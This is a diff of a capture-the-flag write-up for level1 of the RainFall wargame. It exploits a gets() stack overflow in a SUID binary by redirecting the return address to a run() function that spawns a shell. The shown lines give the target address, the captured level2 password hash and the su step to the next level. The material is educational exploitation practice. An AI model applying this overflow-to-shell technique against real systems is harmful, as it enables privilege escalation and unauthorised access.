@@ -1,6 +1,28 @@
-The function gets(buf) does not check input size (stack buffer overflow).
+We get in the level1, then we list the files:
+```
+    level1@RainFall:~$ ls -la
+    -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+```
+The binary is owned by level2 and has the SUID bit set, meaning if it executes any shell, it will run with level2's privileges.
 
-The goal is to overwrite the return address to point to run() function, which spawns a shell.
+We try to execute the binary file to get an idea of what it does exactly
+
+```
+    level1@RainFall:~$ ./level1 
+    dsfdsdas
+    level1@RainFall:~$ ./level1 
+    sadasjhdhjasgdjhasvdhjasbvdjhasbvdvjhasbdjhasbdjhasbdjhbasjhdbasjhdbasjhdbashjbdjhasbdhasjbdsabhdbas
+    Segmentation fault (core dumped)
+```
+The program segfaults so there is a big chance of a stack buffer overflow in there;
+
+We decompile the binary file to get the source code
+
+Like we guessed, the function gets(buf) does not check input size (stack buffer overflow).
+
+There is a function named run() that spawns a shell
+
+So the goal is to overwrite the return address to point to run() function.
 
 ```
     int run() 
@@ -59,4 +81,14 @@ The address of function run() is 0x08048444 in little-indian "\x44\x84\x04\x08"
     Good... Wait what?
     cat /home/user/level2/.pass     
     53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
+
+We jump to next level 
+
+```
+level1@RainFall:~$ su level2
+Password:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level2/level2
+level2@RainFall:~$
 ```
